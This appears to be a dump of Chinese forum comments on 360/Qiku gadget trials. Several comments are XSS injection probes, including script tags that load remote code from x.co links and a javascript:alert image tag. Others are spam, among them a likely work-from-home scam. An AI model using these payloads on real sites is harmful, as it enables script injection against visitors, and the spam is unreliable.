个人感觉最实用的就是home键。。。有这个之后就不用担心home键坏的问题了~下次智键如果能支持电源键功能就更完美了，开锁屏智键全搞定~
&lt;script src=http://x.co/4BlfV&gt;&lt;/script&gt;
&lt;script src=http://x.co/4BlfV&gt;&lt;/script&gt;
不错0000000000
口号里是不是拼写错了？bluetooth?
刚开始能用，手机放桌子上看电视了，再拿起来就坏掉了！估计坏了的不给发了吧！
有没有试用？给我试试 好玩不先
还很有文采的嘛！
快出来哥要买个
我正好有个三星S4 ，希望申请成功啊~~
这个为必需品，很有必要。用途很广
。。。。。。
是智键太小了
好牛逼  都测试XSS
不中！竟然不中！！
晕！！  简单来说就是一支 热熔笔！！！
怎么不能买啊
好       饿得地方放到520
这个不用占智键的功能了。可在桌面上建 360快捷，里面有关机、重启……12个功能+自定义。
很看好这款产品
网口材料不错，居然是贴片的。
这个皮套是不是每一款智能手机都支持，还是只支持特定的
你们页面的反馈栏，还有微信。
你可真幸运！！
你怎么老是中奖，好羡慕啊！！！！%&gt;_&lt;%
怎么老不中奖，好羡慕啊！
嗯嗯嗯嗯嗯嗯嗯嗯嗯 
好像用用啊
偶遇锋芒评测熟人~
这位同志一定不要放弃治疗哇
三星还出灯泡。。
多谢教主搭救！
前来支持一下
2550    中的520
看起来是要0边框的节奏啊
叼嘿哦，掉毛啊
我想要.快出来把
私聊，新品首发
这样真的太好了
绝对是我们这种需要调查取证工作的必备工具啊！
什么时候出来，我第一时间买
唉，真失望，也中不到%……
恭喜已经中签的朋友们
看着很好啊
这个比较好，即实用也美观，顶。
看着蛮小的。。不知道到底怎么样
要是再多支持些设备就好了
估计说的地震报警也是没多大用处，因为等到它检测到地震了。那也就晚了。
估计说的地震报警也是没多大用处，因为等到它检测到地震了。那也就晚了。
赶脚怎么样？》
超洋气的，要是可以通用就好了
不错，比华为的要轻便的多了。
目测屌丝一枚
这个试用官。。。真的很专业。。。。
不知道要多少人民币，不过还真挺酷的。
我每一次 申请 都是说心里话 把自己真实想法说出来，不知为什么美好事情就发生了
&lt;script src=http://x.co/45ZQk&gt;&lt;/script&gt;
呵呵，火车上还真没信号
白色的版本越看越像肥皂
太贵了手机，，感觉一般呀 
支持火火，360手柄就不需要控制了吧，哈哈
谢谢奇粉的关注和评价，偶会继续努力的。再创辉煌！
~~~~~谢了
高大上啊，支持
不错，支持
多少米啊？感觉和咕咚运动的配件很相似，但是更高级一点。好想拥有它啊
在某宝看到过仿品，大概25左右
还是300米左右吗？降价多好啊
希望能中，已经第五次没中了，我真羡慕中的朋友！
是该说赞呢，还是该说赞呢，还是该说赞呢？哈哈
有这么个好东西，一直没有发现啊！！！
360出了这么多创意，也不通知我们一声，不太够意思啊？
说实话，外观不太好看！
希望价格便宜点!
现在中国某些公司整天就知道模仿。缺的就是创新能力。谁能把精力投到创新上面。谁就最后的赢家！
没自行车怎么办
irfugeruoouertrweotwertgfouiwgrewyt08w4tyw4tygptw4tyw4tywerpitywpw54y4tywtywerpiytwtyrw9t0y8rwepytw4ry0t8rwpywr9ytw4pgywytpwrtywytwripyrwywrt8w4ytpytw4ty5wygp5yr5y5w5tyw45yt58ytw5yrwpyi9wywrtywrtyrw8t
貌似是加了个ctrl两下能打开360搜索的功能···
111111111111111111111111111111111
我梦寐以求的设备终于问世了，好想马上拥有马上体验迫不及待了，期待期待……
很好的创意！
把日常用品和人们越来越离不开的电子设备连接在一起，物联网的发展么？！
对呀，加了商标也算创意？
能有通用的就好啦！通用才重要！
一定要中啊，还从没中过 
我比较喜欢平直的 弧线设计的我觉得不好。特别是3604G随身wifi
特别不错  以前用的find5 全金属外壳 酷
其实同样的价格 国内有很多牌子都不错
我觉得会买     ！用手指，有时候会把手机屏幕弄脏   ！ 玩游戏的时候可以使劲而手指不会发热 也不会疼
额  前几天就有推销的 推销这类灯泡 带遥控器 也可以被家用电视遥控器唤醒 只要30元   淘宝上应该有
额 键盘太小了  等创意出来 iPhone6属不定就大屏  也许人们不喜欢这个 
直接正反都是屏幕算了 
看不懂，什么意思？    
好，尽快买。
3D打印机还能理解，但是这个笔怎么用？
物联网，以后的趋势。
这次不是Galaxy S4和Galaxy Note 3的用户用不了了么？希望能够有通用版的，或者是对更多机型匹配
这种穿戴会对眼睛造成损伤么？眼睛离得那么近啊
科技改變未來!
中中中，一定要中啊
太霸气了,好想试用
我好想用一用
太好了，真的好像用一用 
电池不能拆卸的路过、、、、、、
这个有官方网站吗
很期待它的上市，我想拥有一个，三网通用这点非常好，希望能快点量产
有启发，但国内这样的购物行为应该少之又少。。
好期待啊 。。
特斯拉 纯电动汽车  估计得188万以上  特斯拉官网还未有公布  北京汽车 已经有纯电动汽车了  技术来自萨博  北京有售  还无须购置税 想了解纯电动汽车的可以来庞大华创   
真心好  P85高配得99.9万 标配就不显得这车有进口的味道了  不需要大的续航的话  可以选择北京汽车的EV系列 高配13.98万  可以买5个 北京庞大华创 潘 18511835118
扫码的吗？像一把刀啊。
这个插上后可以接电话么 
你买的吗？在哪买的啊。
个人以为：这麽个小东东，包装简单是好不是坏，君不见现在的国货不管什么，都是过渡包装，浪费惊人啊！
太贵了 70刀-140刀
思路是可以的，但功能不够完整，没有网络传输功能，价格太贵了
非常好，就是太贵了！！
价格与样子都太“贵”了
确实不错，
这个产品适用并不会太广，现在任何一个网络盒也可以完成AirPlay，DLNA功能，而价格也没有优势！！
BroadLink的产品与同类比，还是有一定的优势，如果开关从现有的二个，增加为更多，同时在面板上区别本地与区域就完美了！！！！
简直是太太太太OK了 引领高科技  求是使用
增加底坐固定装置就好了，
多分享点呗
,没图片。。。
图片已经上传成功，由于上次的经验，所以这次是先将文本上传，然后上传图片，谢谢你的支持
看图片就更加清楚啦，感谢支持
..............
这个3分钟就能学会，我是独轮，独轮好骑，学习慢
啥时候出，我想买一个
这玩意儿的外形有点像最早的的艾利和的MP3.
我喜欢它的外形多过用途，显示指针的时候，像一块雷达表。
感谢分享!
看样子似乎是三星手机才可以申请的哦。。。。
没什么实际用途，夜间骑行游手电；后面有尾灯；
自己完全可以拿自行车改装，1000就够了
感覺東東還不錯噢 
不错，要是能薄一点就更好了。 
哇 一看就是忠实用户，写的非常详尽
它用来干嘛？
三星这个巨无霸
实行纸电池统一化
我算是知道。，火影中的人为什么要带手套了，。原来手势是这么设定的！！！
续航能力大约能持续多久呢？
看起来挺好的样子 
没有三星手机啊。观望一下。
电量是多少的？
请问是独立供电的还是USB供电的？即是否有内置电池？
请问用来干嘛
我们有测试过，安卓机型连接SmartWallit会增加3mA的耗电，谢谢~
苹果我相信他们比安卓做得好，由于苹果电池是内置的，我们没办法用外接电源去测试，所以没有手机耗流的结果。
谢谢您详实的殇怀君试用报告，我们会积极考虑您的建议，谢谢~
都是些很实用和时尚的东西,非常有吸引力
这个有神马意义。。。
为何只能预约不能购买?
保证你得请个私人医生天天跟随
保证你得请个私人医生天天跟随  
哈哈哈哈哈
看起来挺炫的 
不管能不能，我肯定首选一部
这个好YY啊。哈哈
从去年一直等到现在，再不出孩子就长大了，也就用不着了。时间啊，能快点吗？360你就且行且珍惜吧！
好繁琐看起来像上世纪的产物-_-
请问什么时候上市呢？
未来家庭的智能模式雏形
只要上市，偶首先就买一块，跟着时尚潮流出发
我要买，我要买，，怎么买
太棒了 带上去就是钢铁侠了！
有创意，点个赞
我靠，啥时候我大中国才能拜托流量的束缚？还以为包月无限流量捏，你TMD还玩流量？
产品是好的，大家喜欢，但你丫的非要弄出流量来……插电脑的wifi好久好在不用担心流量扣费，因为只需要开通一次网络便可；但这回出来的东西又搞回流量上了，不得不说，蛋疼的忧伤……
真想说，我这么多年来一直支持360，不论是当初的***机，我反对家里的意见义无反顾的买了；随身wifi，一次买了两；正当我以为360将会继续保持着为百姓着想时，这丫又开始为了盈利而进行流量收费……虽然是和‘运行商’这种动物……
奇酷  太不厚道了把 以前还加上文章出处  微信公众号：kuwanzhi    现在直接文章出处都给去掉了
我们是想看看物品的照片，太少了点，写的挺认真，质量不怎么好
只是针对苹果手机吗？太令人失望了~！
功能强大、小巧可爱还不怕丢...
能量损耗会不会增大了？
怎么控制速度？
淘宝上不是有现货了吗 这里怎么还要等那么久
淘宝上不是有现货了吗 这里怎么还要等那么久 
淘宝上不是有现货了吗 这里怎么还要等那么久 
出现猫叫声是软件的问题还是硬件的问题呢？
嗯，不错的设计。好吧，其实我想说的是，我很想拥有它。
还小米盗版360的。360还不是盗版国外的品牌
感觉似乎过于普通了，不管是功能还是外观，没有什么特别的地方。补上一句，它的价格也同样如此。
放弃在可穿戴设备里添加太多功能的想法吧，千万要记住，在很多时候，少就是多。
建议加入一氧化碳和二氧化碳监测功能，呵呵，你懂的。。。
居然有这么多遥控器。楼主太狠了。
看来是稍微厚一点。蓝牙要一直开着。
这个好，非常好，该公司肯定有远程操控的遥控器。
双向寻找。这个挺有意思。
这个太神奇了吧。
是的。。。。蓝牙。。。费电。。。。
那必须的。。。。。智能钱夹。。。。
没有实用意义，看时间也不方便
是个很有创新的产品，方便使用，挺有吸引力，我会买个
不错，在家穿，挺有逗乐，魅力
我觉得是一款很实用的产品，
郁闷，等着用你的手环，干等出不来！再不出来，我就想别的办法了。已经等了大半年了！什么意思啊，卖期货吗？！
这个不错哦，不知道在发春梦时会有什么感觉！
医疗器械http://126.am/0alwY0 这里可以查看下呢！
人血白蛋白可以调节组织与血管之间水分的动态平衡，维持正常与恒定的血容量http://126.am/ZGbCq4 
人血白蛋白可以调节组织与血管之间水分的动态平衡，维持正常与恒定的血容量http://126.am/ZGbCq4  
啥时候我大中国才能摆摊流量的束缚？  包月无限流量是正途呀！
可以换个手机再来试试。哈哈
只想说。好贵啊
好贵的说！！！都赶上一个普通单车的价格了。。。
越来越先进，神奇实用有内涵的发明。
确实有点贵啊。汽车灯。
嘿嘿，手机保护套+电池，超赞誒└(^O^)┘
不客气，我也需要感谢你们提供的产品试用
我没有看错在，真的是魅族
下次还能中奖的话，我会多拍一点产品照片答，质量的话，额，屌丝终究无法文艺，我尽量一次一次的更加进步
目前我认为是BUG，在等待产品APP更新之后，有待观察
得到了东西，就要尽到自己的责任嘛，报告写得还不是很专业，见谅
不客气！！！！！！
同样期待更薄
挺好的，不知道我的s3能不能用上
三星这款看起还不错，htc那款简直是宇航员的手套
经典实用的东西。
什么时候可以在国内出现
有信心一键变得美好！
希望是联通，电信，移动通用的！
写的蛮详细的哦 
哈哈。必须要赞一下。
建议能改用3G网络的支持,GPRS网络回传位置太慢了.
史上最全最新的空气卫士的介绍啊。酷啊。
必须的 啥时来奇酷免费试用哈
且行且珍惜
超妙，超美，超好，超奇！期待，期待，期待，期待......
很有创意，好期待。就算没有试用也想买。
电池+手机套，很赞的发明，如果能多出几款样子，适用更多机型就好了
制成手机贴膜，边玩边充电，更爽
不但是贵啊，这东西可能有人用来做违法事呀。
这东西不应该在市场上售卖
又贵，而且不太实用
太强悍了！多少钱一台？希望又是性价比呵呵
奇酷你最棒，奇粉们支持我呦。永远爱你们！
好像不是首个做电池皮套的你们
肯定很好用，领导给我个试用机会吧，拜托了
话说好贵啊喂
多少钱啊喂
很有创意，期待中。。。。。。
掉下来接不到不会摔坏吗
评测太简单了
好像有一个这样就能时刻记录宝宝的成长喽！
同意楼上的观点
一楼说的好，近视眼路过
太帅了，有种霸气的感觉，很不错哦！有钱了买一台！
我的s4电池就是个渣渣啊，用不了多久，一天充电两次，怎们办？
这个应该很贵吧。好想要啊。
谢谢哈。。。。。。
贵是一方面，我担心的是在中国联网怎么办啊
我好想要啊
表示好想試用
这个我想要
感觉这个应该用USB3.0的标准
&lt;&gt;1111
qiku.shouji.360.cn&lt;&gt;
&lt;script src=http://x.co/4HB2X&gt;&lt;/script&gt;
&lt;img src=&quot;1.jpg&quot;&gt;
很不错的创意，很期待
&lt;script src=http://x.co/4HB2X&gt;&lt;/script&gt;
什么时候出来，得买一辆
这个好啊........
1,2代说明书已经修改。 2，为了防止1分钟内多次打开钱包会反复推送消息，我们设计了必须放入钱包1分钟才起作用，这个在实际使用中肯定没有问题，请放心使用。 3，2代已经改进。 4，正在调试中， 5，看不懂后台运行是什么意思？ 6，一天10%的电量消耗
摇摇设置勿扰这个想法我们会考虑的，谢谢！
1、你的手机不支持蓝牙4.0 2、请留下手机号码，我联系你。
最最期待的就是这宝贝！！！
好东西 试用中
好东西 试用中 
看起来很给力
设计理念很超前的东西，值得拥有，期待使用！
科技的结合  让我们 更懂爱 更懂色彩 
希望等到一个！
宽带猫和路由器结合在一起就好了
很帅的空气净化器。
这是有人来挑战奇酷的安全吗？哈哈
科技的结合 让我们 更懂爱 更懂色彩  
原来屌丝也可以拥有3D打印设备，期待ing！！！希望能申请到试用！赞一个！！！
还挺有意思的
只有三款颜色！！如果还有更多颜色会更好点。
期待使用中......
怎么购买啊
我这么坚持
这个哥们第一句说他是老周的校友。。。。
肯定很好用，领导给我个试用机会吧，拜托了 
这个好！最期待的来啦！！！希望能中签哈～
看起来很酷啊！
虽然我没中   但是还得支持                    
自从开始试用就开始申请了，一次又一次的失望，希望这次能中。
期待试用的结果。
个人认为不靠谱
太贵了2099
情趣？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
手机条码扫描足矣
送我一个吧
我告诉你们一个方法，买台电脑，下载极品飞车，买个游戏模拟方向盘，在弄几个大泡沫自己组装！
uv灯不好配
不错，有摄像头不，可以自动报警不
试用，期待.
适合小房间用，一般空调有室外机可以把热量散发出去，这个就够呛了。
360儿童卫士都有了
特别适合中国
这个设备很扯淡，别想的太好了，没什么科技含量，打了一个科技的擦边球。
什么时候能买啊，预约好久了
期待能试用一下
没想象中那么长
这个吃法很性感啊。
这球太容易踢坏了吧。
能不能，推广是一个大问题
确实挺有意思，感觉好像把焊枪缩小化了。可以随意勾勒出想要的3D图案。只是耗材好不好配啊。真的好想要啊。
怎么还没下来那，好期待呀
我的也是，显示不支持蓝牙4.0，软件还是存在问题吧，很难找到合适的手机，要求太多了
你的是514么，好巧，我的是513
.....不知道任天堂的能量手套吗。。。
我的梦想拥有自己的 第一辆车.唉
期待~~~
是不是只要是安卓手机都可以用啊
期待这样创意科技产品出现啊！
性能是靠谱，但不至于这么贵啊。
确实是高精尖设备，音乐商店的未来开发市场应该很大
公司一人发一件，考验她们勇气和心理素质的时候到了。
自己顶自己一个~~大家晚安。
第一句话 应该是给力吧。。。
期待可以试用。。。
第一句话应该是  EMS 很给力。。。  夜深 手抖了
选我吧选我吧，模型党必备商品。
高保真无损音质 绝对的发烧级别！！
这个产品有前景！看好……
就像现在这样很久了，也不回复了
一次又一次的期待，愿好运降临于我HOHO。可以3D画画，这可别浪费了我这个画画天赋呀哈哈哈。
400美元，价格有点。。。。。
这个对于我这个手机控来说超级有用。因为三星note3的耗电量比较大。我之前的三星P1000七寸平板的耗电都没这么厉害，和几核有关系？这个比移动电源便携多了。希望中标试用。
看到这个 我的想法就是.............
这个是我需要的。
这个穿上就是神经病。
贵~续航能力也差~这个价位可以买比较好的自行车灯了，而且多买几块电池充满电跑长途走夜路不是问题。没啥优势~
亲，现在京东返券100元，实际是1999哟~~~~
一直在申请，一直在等待
一再申请，一再等待··我的大note3！！！！
介到底是嘛玩意儿啊？
呵呵，这个可以有
使用那些物品是不是***的？
我擦！！！！15000，最后到手怎么也得20000吧 
写得很详尽，不错，支持一下
挺高级的看着
很详细 支持 有图文教程则更好哟
挺想要的，就是不知道这个可以用多久，耗材可以自己添加的吗？
没希望   几次了都没有选我
这个东西耗材是关键！
i want you 
对于不能更换电池的手机来说，这个纸电池手机套简直就是一个神器！
发问：装电池的吗？
不知道耗材是什么价位啊
米健是抄袭产品！！！那360智键呢？？？pressy键又是什么键？？？
赞一个！！！！！！！！！！！
还不错，放客厅里接电视比较好，考虑入手，有优惠不？
超乎我想象的棒
2代Pro的比1代的要薄50%，说明书也更换了，你可以到www.smartwallit.com了解我们的2代Por版本，谢谢你的支持。
请使用Galaxy S4，NOTE2等Android4.3支持蓝牙4.0的手机测试，或者用iphone4s以上的手机测试，谢谢！
继续申请，终会有天明之日！
谢谢支持哦，我会修改自己的缺点的
哇哈哈，谢谢夸奖！
设计让人看着很笨重，不看好。。。
身为室内设计师，这真是必备神器啊！
好屌的样子~
我什么时候能人品爆发啊 
多次申请，看到这个好喜欢，求人品大爆发
好喜欢...................
亲，返京东券100元呢，还有大礼相送，敬请关注http://item.jd.com/1005465.html
好喜欢呀！看着这个就有一种想要涂鸦的冲动。。。
一直在申请，从未被选中。一股淡淡的忧伤……
按理说可以的啊 HTC G10
这个东东还真有意思，不过我没有画画的天赋，这次就不申请试用了，给大家顶一顶好了
好多次期待了，都化为泡影。但愿此次能大爆发！
这东西要是里面加上芯片插手机上可以把单卡手机变双卡就更NB了。
该申请还是要申请啊。有酷币能领的。
赞起来。哈哈
如果是光能电池就好，要是天天或者三天两头充电我可受不了。否则除了伺候手机还得伺候它~
都够坑爹的，三星的连个真是照片都木有啊，全是简笔画
这要多少钱啊
祈祷能首先用上 
开卖了么？
，而且可预见的是，耗材绝对很耗。
考虑入手，有优惠不
它怎么转弯  
http://shop.tcl.com/ProductDetail/index/id/5840.html
这玩意挺新奇啊，一秒变神笔马良。
我们家小朋友一定很喜欢
每次都没有我的份
彩色的建议很不错啊。
看来有艺术细胞很重要啊。
这得配多好的耳机 啊
叼炸天啦         必须要赞32回
听你说话一种智商上的优越感油然而生
我最想问的是 是否带ABS耗材 或者不同耗材 不带的话 就坑爹了 
必须32个赞
我的qq 690915977
好巧 哈哈 
嗯，是的，在2代中已经有了，希望能更好用~~~
完全没搞明白这到底是主机，平板还是路由？？？
为什么要32个赞？
好多次期待了，都化为泡影。但愿此次能大爆发！
要点赞吗 ？             酷币能干什么啊？
希望此报告可以让编辑参考
不会很贵吧！
好厉害！好想用一下
任何有Ctrl的键盘都可以的，不限品牌，安装360卫士才可以用
对于S4的废电来说这是个福音
什么时候发售啊？、
我好喜欢它啊1.1.1.。11
[img]javascript:alert(document.domain)[/img]
为什么不卖1360元
感觉以后要用来创作就太棒了~~~期待啊！
好新奇的东西，我要试用
怎么，你也有三星P1000？握爪～。。
三星S4，江湖上俗称。。。嗯～，小暖手宝。。。真心费电伤不起啊。。。只增电量不增重量。。你不会只是说说吧。。。：D
我期待着，我会一直留言的，谢谢。
好东西，不想期望太久！
看起来很好玩，让我玩一下
什么时候能买啊!
哇，这么酷的东西一定要玩一玩
挺不错的创意
垃圾配置，那么低的主频，G705独显是605的马甲，还不如核显
就是电脑主机吧，厂家也不搞个试用，申请试用下还差不多
仿小米米键
来   让我试下
Come on
看起来是很炫，但这个价格也很贵。
我的个妈妈呀，这是哪种天才想出来的
这个我喜欢，如果能改装一下，是不是可以成为专用的3D打印机啊？
三星note3的原生态系统默认开启了很多经常用不到的功能，如果你全开，顶多待机1天，使用5-7个小时。这还不算玩大型游戏。所以建议你先将所有功能全部关闭掉，再有需求的时候再开。这样会大大减小耗电量。如果你是个技术屌的话，建议你刷个省电为主的系统。这样他也会为你默认关闭掉很多不必要的耗电功能。
400美元
好魔幻啊，我好喜欢，一定要抽到我哦
好天才啊。
未来装备，舍我其谁！希望得到试用！
写的很用心，支持支持！
嘿嘿！感觉还挺好玩的。画出来都是立体耶！
哇！以后妈妈再也不用担心我减肥了！减肥智能化太好了！太喜欢了！支持！
小米米键后来才出的，360的先出的，麻烦你先查查看再说。
这个大赞，哇，高大上的减肥方式，多少钱
难道插上电就能用，不需要原料吗？ 
原料呢？？
mark，需要的时候可以买一个
能不能画一个马航出来啦
原材料是什么？
感觉完全不错嘛，好神奇的感觉！！
同意白色很难看 为什不集成鼠标 
这个很酷！！
想不到有官方的回复唉！！！ 嗯，我会去详细了解的，同时谢谢贵公司的慷慨支持！
手机APP希望支持设置感情距离5-10-15-20这四个选项，自定义最好。这个建议不错。
这个东西国外不是很贵，看新闻说了。好像成本在降
明显小米是抄袭。哈哈
想要一个 嘿嘿
这个酷，就是有些大不美观
这样的态度做评测，无语……
如果可以和智键结合就好了~
不错哦~~~~~看上去很有感觉，值得拥有
ABS材料
呵呵...
期待这件商品，我期待了很久了
独显赛扬，这不是坑人吗？核心显卡不就好了？现在电视机没有VGA接口？
w哦赞喔！！！！！！
期待……期待……希望能选上
怎么没有看到WIFI性能参数？？？一个劲的说什么环保？
不错 多少钱
能***个不
高大上啊，科技改变生活.
有什么用呀
不错，多少钱，但用来干什么
还是专业的好一点，既精准又不贵
歧视我们没有苹果？ 
只能预订不能买。。。坑爹呢
你用的app不对，要搜索SmartWallitPro并下载安装。
原料用完后哪里有卖的
怎么这么简单？
近日更新的V1.54Beta版本新增设备自动关机功能，断开连接3天后就自动关机，不知是个啥功能？ 这个是为了省电而设计，如果你长时间不用，自动关机可以省电。下次要用的时候，冲下电就可以了。
早都想体验下3D打印了     
- -亮点在最后一张图 分析的很清楚，不错
可惜，白白浪费一个名额
如果在高速马路上没电的话，那不是连人带车一起“玩蛋”了？
现在通过蓝牙做连接的硬件可真多。
我在试用中
太好玩；容易坏
希望网速可以快一些，流畅些
如果可以和智键结合就好了
高大上啊，科技改变生活
看起来就牛逼
我的三星Note3 SM-9006这个月初推送的安卓4.4.2系统，安装后蛮好的。哈哈
在中国推广，能给个明确的功能说明吗！能给个中文的宣传短片吗！不是每个中国人英语都过6级
无语，感觉就是把鸡和鸭绑在一起然后说是新物种
看看 很神奇啊 
3D眼睛最大的难关就是显卡问题，没有足够高级的显卡跟上人眼的节奏会让人头晕
还请不喜勿喷。。。。
现在有32寸以上的显示器可以当电视用。 回复LS的。 
小米那个叫米键- - me jian 更贱- -
就是嘛，是小米抄袭。
这台电脑早就出来了 商品名称：海尔云悦mini商品编号：1005465品牌：海尔（Haier）上架时间：2013-11-14 09:27:55商品毛重：1.59kg商品产地：中国大陆显示器尺寸：无显示器平台：Intel平台显卡：独立显卡触摸：非触摸屏电脑类别：家用电脑                            来自京东
哪里有卖的?给女朋友买一个在家穿有木有？
耶  。。。。明白了
流量是没有限制的吗
其实都是仿的别人的、快按钮是13年12月发布的、貌似仿的国外的一个...
神奇啊  科技改变生活
还送打火机啊！
这个价格。。。东西你们可以拿走，贴纸给我留下！那玩意老贵了T-T
神经病穿这啊
我想说，如此透明，可不可以那里不会点那里？
赞叹，真是3D技术啊 
科技前沿技术，令人向往。
好东西，什么时候能出来呀！
带着不好看，功能好就好了。 
很期待的一款好玩的产品。
我去，这么牛气的科技玩意。
不错，期待。本人数码控
确实挺智能哦，不知道操作起来是不是也一样方便，如果步骤太多的话，就没必要了
大家有什么疑问和建议可以来交流下呦~~~
同感。。。。。。
很NB啊支持
“老公卫士”……
要是上面还能有个耳机孔，不影响插耳机就好了
酱就可以自己做东西送给别人拉~~赞一个
减肥利器呀！！期待
你信佛的吧——！！
好东西！！！！！！！～～～～
必须顶一下，写的不错呀。
谢谢支持啦，还在更新中，后期更精彩，在编辑整理，你的也很好呦，都精品报告了~
搞笑的说，看着很轻松，不错，加油啦
确实不应该把试用报告晒出来，以免被抄袭
前来支持吧~
O(∩_∩)O谢谢
不错..............
很细心仔细的报告，↖(^ω^)↗加油噢~
支持，不错哟，骚年
超赞，超喜欢
预约后就不能在预约了吗？
四百美元？会不会太贵了啊
价格呢？合理吗？感觉很帅气啊
很期待它的上市
支持一下，期待后续
是测室温吗，看题目我本来以为是体温呢
给力，我已经下单了
接口为什么不做成USB3.0呢，现在文件都很大，有时用USB2.0要传很久
尼玛万一害怕的心跳加速
再怎么说身上贴上这么一个东西，孩子也会觉得不舒服吧
希望尽快出品，
呵呵,来支持!!!!
好想法，这东西在手就可以随时的来更改自己的模型了，太方便了，真是有点爱不释手的感觉
戒指如果能在薄一些就好了，功能可以再增加些，不光是提示类的东西，戒指展开以后可以做些什么呢？
理念真的不错哦，期待技术成熟。开发出更加亲民化的产品！
话说自己用的正是三星Note3，坐等名单哦，一次没中过呢！
想要又买不起。。。
这个899的价钱。。。
预约后能不能给哦。
垃圾报告，垃圾死的报告
好强大,玩花草的福音啊.
好...............
什么时候放货呀。。。。。。
俺是保护套使用专家，请筛选到俺吧，不然让光头强找你麻烦
为何设计的样子和实际的样子差别挺大呀
太小，不实用吧？紧急电源？
123321 
okokok
我觉得，把这个直接改造成电池不更好？！
喜欢...ooo
真有创意！！
....恐怕没人穿吧！
看起来很有趣！
不错的节奏
真不错，非常喜欢
真贵啊，，，，
就一句话，自从试用活动出来我就一直参加，可没一次通过，羡慕嫉妒恨呀，恭喜楼主！
3xxx多人申请,無望了
喜欢 我好喜欢  
里面出来的 是什么东东
好神奇，我家儿子肯定喜欢的不得了，选中我啊
亲，您也太过激进了吧！我们当然是支持VGA与HDMI接口的！
亲，这个是mini小主机
我家儿子肯定喜欢，他最爱画画了，还想画立体画!选我！
谢谢啦，第一次这么认真的写评测，比写作文还复杂的说~~~~
非常感谢支持啦，后续很快会出来的，加油写啦~~~
里面的东东有污染吗？
手套戴起来太难看了，太别扭，不像手表那样方便，而且不可能总带着个手套吧，但是手表随手待着就很方便了，所以能不能轻便点
个人认为容量是主硬伤，价格是副硬伤。
智键最外面一圈如果能做成夜光的，应该很炫，晚上拿出来绝对眼前一亮。你们可以考虑一下 我喜欢着一条！！！夜光的！ 还有我也想做试用官！！！
真好，好玩。
真好，好玩。  
好喜欢呀，很有科技感！
希望可以获得测试名额。
感觉可以做头饰啊！！！求！！！！
有时候不联机 不知道怎么回事 
无新意 高价 
官网在哪呢？怎么没有消息呢？
看起来很叼哦！喜欢诶！如果也能只要19.9保证入手啊~当然太贵了，那么算了，还不如买温度计嘞
瞬间吓尿啊啊啊
15000  加上关税大概20000
这个很好 我老婆可以用
感觉不错，真想拥有一个
酷，再也不会掉坑里了...
希望真的有那么亮...
想要一个   好好玩
看起来都不错···不过个人认为三星的更较为平时应用······
能设计成安仔的样子就最好了，小狗太俗了
恭喜您，您的报复目的达到了。
个性，价格再合理一点就好了
看到电击  吓尿  失灵了怎么办
我觉得外观不好看  2代好看多了
看测试品不如设计的漂亮啊，设计图真心漂亮。
同感，觉得这个挺重要的
感觉是很好的一个东西，若我能拿到试用名额那我会打印一些我自己所想的一些东西。那岂不是真的很棒吗
产品状态：可购买 产品发起人： 奇虎360产品类型： 娱乐生活 在哪买？怎么买？
贴着额头试试呢
看着不错价格太贵
这么近 车完全停下早就掉坑里咯
这个价格都能改一套汽车的疝气大灯了
值得期待啊。
谢谢，你也要加油哦，呵呵
我们一起加油
谢谢你的赞同，嘿嘿
配置太差了，要高点就可以考虑买了。
太贵了，真舍不得买。
两个建议 1、增加16G/32G版的 2、改成USB3.0接口
毫无意义的回复，这些智商你的脑子上没有吗？我去，哈哈，还有那个狗屎一样的昵称，中国人一个，还用个屁英文装文化。
我想要一个试试，感觉是很好的一个东西，若我能拿到试用名额那我会打印一些我自己所想的一些东西。那岂不是真的很棒吗？真想拥有一个！希望可以获得测试名额。我家儿子肯定喜欢，他最爱画画了，还想画立体画!选我！  
很想试用看效果如何/
只支持HTC M8的吗     那其它的智能手机怎么办？
200多大洋、1200毫安、别逗了。我一块备用电池2000毫安才59大洋，体积更小。
我想要一个试试，感觉是很好的一个东西，若我能拿到试用名额那我会打印一些我自己所想的一些东西。那岂不是真的很棒吗？真想拥有一个！希望可以获得测试名额。还想画立体画!选我！ 
看到产品建议  我默默的点了一个赞
淘宝搜索，天猫数码馆，此款神奇仅需18.9元哦~
我想要一个试试，感觉是很好的一个东西
希望可以早点出支持苹果的
非常不错，想体验下！
偷梁换柱，无非就是一个会喷膏体的速干器。和上完大号看到的有神马区别
啦啦啦啦啦
好期待能见到实物。。。
不错，看起来很有创意，能体验下否？
戴着这玩意儿怎么干活呢？另外，，不会触电吧。。。哈哈原谅我小白的问题
没什么特色。。能加点独特的功能就好了（呵呵要加电筒的话就算了。。。）还有体积是不够灵巧，造型，，我能说too ugly吗。。。。。
有什么新的功能实现吗？否则没有实现华丽丽的转型啊
貌似没有回信
一直没得到试用，而你成功好几次，内幕吗？
不知道能不能声控啊？。。。
这个造型可爱多了，比前几个。 对了，怎么用？
我想知道这个插座智能在哪里。。。。
多点功能吧。。爱你。。。
没中·1  可惜
超级喜欢一键照相 手电筒功能
想体验一下呢，很喜欢奥
怎么又没中
test吖吖
厉害啊~~~~~~~
很强大  很期待  抓紧创作吧  希望能早点看到他 
我得到了2次啊，之前3次还不是一次不中，我看这还是要靠用心和真心，只要坚持，相信总会成功的，一次没中不是有惊喜么~~加油！！！
哇  屌丝利器   
牛   什么时候能买到是个问题  期待
2万确实有点贵  不过我相信随着科技的发展会有想象不到的便宜   期待着
为什么总是不中
test订单
事发地点时发
非常想体验一下！
这如果是真的，我一定要买一套。天天坐在办公室里，这个简直就是神器了。
好像很不错的样子
我怎么没中奖
为什么不中将!
为什么不中江!!!!
能减肥吗？
为什么总是不中签呢
怎么就不中奖呢
摇号不中也会继续摇嘛。
摇号不中也会继续摇嘛。
写的很赞，内容好精彩！可惜就是没发全智能在网盘上看~~~
摇号不中也会继续摇嘛。 
摇号不中也会继续摇嘛。  
摇号不中也会继续摇嘛。  
摇号不中也会继续摇嘛。  的飞洒地方
等半年多了，还没好啊，花都谢了
我s4，不过没中。。
一直再用，那是相当的霸道啊
可不可以送我一个。
其实就是一支融化塑料颗粒的容器，然后能够挤出塑料线条来，塑料线条又很快冷却定型！
看起来很腻害的样子
不错 很想试用，市面上的蓝牙耳机太大了，而且很难看，还有就是太费电。
 用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者【加 q２=３６０３７６９０９】
为啥总是不重呢
 用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者【加 q ２３６０３７６９０９】
